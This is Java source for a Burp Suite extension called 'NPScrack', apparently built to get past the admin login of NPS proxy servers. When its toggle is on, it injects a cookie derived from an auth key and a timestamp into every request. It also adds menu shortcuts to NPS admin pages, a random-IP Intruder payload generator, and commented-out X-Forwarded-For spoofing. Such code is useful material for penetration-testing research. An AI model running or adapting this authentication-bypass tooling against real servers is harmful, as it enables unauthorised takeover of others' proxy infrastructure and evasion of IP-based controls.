package burp;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Project: fakeIP
 * Date:2021/5/21 上午11:07
 *
 * @author CoolCat
 * @version 1.0.0
 * Github:https://github.com/TheKingOfDuck
 * When I wirting my code, only God and I know what it does. After a while, only God knows.
 */
public class BurpExtender implements IBurpExtender, IContextMenuFactory, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator, IHttpListener {
    public static IExtensionHelpers helpers;
    private String PLUGIN_NAME = "NPScrack";
    private String VERSION = "1.0";
    public static PrintWriter stdout;

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        helpers = callbacks.getHelpers();

        stdout = new PrintWriter(callbacks.getStdout(), true);
        String banner = "[+] %s %s is loaded...\n" +
                "[+] ####################################\n" +
                "[+]    Anthor: GODV\n" +
                "[+]    Github: https://github.com/weishen250\n" +
                "[+]    Team:   ENO Team \n" +
                "[+] ####################################\n" +
                "[+] Enjoy it~";
        stdout.println(String.format(banner, PLUGIN_NAME, VERSION));

        //注册菜单
        callbacks.registerContextMenuFactory(this);
        //注册右键
        callbacks.registerIntruderPayloadGeneratorFactory(this);
        //注册插件名称
        callbacks.setExtensionName(PLUGIN_NAME);
        //注册一个http请求监听
        callbacks.registerHttpListener(this);

    }

    @Override
    //右击菜单
    public List<JMenuItem> createMenuItems(IContextMenuInvocation iContextMenuInvocation) {
        List<JMenuItem> menus = new ArrayList();
        JMenu menu = new JMenu(PLUGIN_NAME);

        JMenuItem nps = new JMenuItem("启用插件");
        JMenuItem index = new JMenuItem("查看仪表盘");
        JMenuItem cile = new JMenuItem("查看客户端");
        JMenuItem dotcom = new JMenuItem("查看域名解析");
        JMenuItem Http = new JMenuItem("查看HTTP代理");


        menu.add(nps);
        menu.add(index);
        menu.add(cile);
        menu.add(dotcom);
        menu.add(Http);


        //判断是否右击了鼠标
//        if (iContextMenuInvocation.getInvocationContext() != IContextMenuInvocation.CONTEXT_MESSAGE_VIEWER_REQUEST) {
        if (false) {
            return menus;
        }

        //点击菜单实现的方法
        index.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent arg0) {
                try {
                    String Func = "/Index/Index";
                    Utils.EditIndex(iContextMenuInvocation,Func);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);

                }
            }
        });

        cile.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent arg0) {
                try {
                    String Func = "/client/list";
                    Utils.EditIndex(iContextMenuInvocation,Func);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);

                }
            }
        });

        dotcom.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent arg0) {
                try {
                    String Func = "/index/hostlist";
                    Utils.EditIndex(iContextMenuInvocation,Func);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);

                }
            }
        });

        Http.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent arg0) {
                try {
                    String Func = "/index/http";
                    Utils.EditIndex(iContextMenuInvocation,Func);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);

                }
            }
        });

        nps.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent arg0) {

                Object[] options = {"OFF", "ON"};
                int flag = JOptionPane.showOptionDialog(null, "AutoNPS Status: " + Config.AUTONPS_STAT, "FakeIP", JOptionPane.YES_OPTION, JOptionPane.PLAIN_MESSAGE,

                        null, options, options[options.length - 1]);

                switch (flag) {
                    case 0:
                        Config.AUTONPS_STAT = false;
                        break;
                    case 1:
                        Config.AUTONPS_STAT = true;
                        break;
                    default:
                }
            }
        }

        );

        menus.add(menu);
        return menus;
    }


    @Override
    public boolean hasMorePayloads() {
        return true;
    }

    @Override
    public byte[] getNextPayload(byte[] bytes) {
        String payload = Utils.getRandomIp();
        return payload.getBytes();
    }

    @Override
    public void reset() {

    }

    @Override
    public String getGeneratorName() {
        return PLUGIN_NAME;
    }

    @Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack iIntruderAttack) {
        return this;
    }


    public void processHttpMessage(int i, boolean b, IHttpRequestResponse iHttpRequestResponse) {
//        if (b && Config.AUTOXFF_STAT) {
//            if (Config.AUTOXFF_VALUE.equals("$RandomIp$")) {
//                Utils.addfakeip(iHttpRequestResponse, Utils.getRandomIp());
//            } else {
//                Utils.addfakeip(iHttpRequestResponse, Config.AUTOXFF_VALUE);
//            }
//        }

        if (b && Config.AUTONPS_STAT){
            String auth_key = Example.getAuthKey();
            long timestamp  = Example.getTimestamp();
            Utils.AddNpsCooki(iHttpRequestResponse,auth_key,timestamp);
        }

    }
}



